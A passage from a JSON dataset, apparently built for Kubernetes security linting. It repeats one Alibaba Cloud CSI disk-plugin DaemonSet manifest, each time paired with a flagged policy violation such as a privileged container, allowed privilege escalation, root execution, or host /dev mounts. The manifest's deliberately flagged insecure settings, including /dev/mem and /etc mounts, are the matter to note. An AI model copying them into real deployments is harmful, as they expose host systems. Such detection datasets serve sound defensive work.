    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-plugin\" does not have a read-only root file system"
  },
  {
    "id": "8766",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"disk-driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "8767",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"alicloud-csi-plugin\" not found"
  },
  {
    "id": "8768",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"csi-plugin\" has AllowPrivilegeEscalation set to true."
  },
  {
    "id": "8769",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"csi-plugin\" is privileged"
  },
  {
    "id": "8770",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "8771",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"disk-driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "8772",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"csi-plugin\""
  },
  {
    "id": "8773",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
